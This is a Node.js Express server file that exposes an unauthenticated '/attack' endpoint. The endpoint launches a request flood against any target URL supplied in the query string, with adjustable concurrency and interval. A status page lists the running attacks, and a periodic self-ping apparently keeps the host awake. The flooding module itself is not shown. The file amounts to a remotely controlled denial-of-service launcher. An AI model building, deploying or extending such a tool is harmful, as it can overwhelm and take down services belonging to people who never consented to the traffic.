'use strict';

const Stress = require('./stress');
const express = require('express');

// Constants
const PORT = process.env.PORT || 8080;

const instances = [];

// App
const app = express();
app.get('/', (req, res) => {
  const response = instances.map(x => "Target: "+x.target+" Loop: "+x.stats.loop+" Current stats: errors("+x.stats.errors+") success("+x.stats.success+")").join('<br />');
  res.send("Status:<br />" + response);
});

app.get('/attack', (req, res) => {
    if(!req.query.target) {
        res.sendStatus(400);
        return;
    }

    const stress = new Stress();
    instances.push(stress);
    const conncurrency = req.query.c ? parseInt(req.query.c) : 100;
    const timeout = req.query.t ? parseInt(req.query.t) : 1000;
    stress.run(req.query.target, conncurrency, timeout);
    res.send('Attack '+req.query.target+" Amount of requests: "+conncurrency+ " Interval: "+timeout+"ms");
});

app.listen(PORT);
console.log(`Running on ${PORT} port`);



var request = require('superagent');
const selfTest = () => {
    const url = process.env.URL;
    if(!url) return;

    request.get(url)
        .end(function(err, res) {
            if(!err) {
                console.log('selftest OK');
            }
        });
};

selfTest();
setInterval(selfTest, 300000);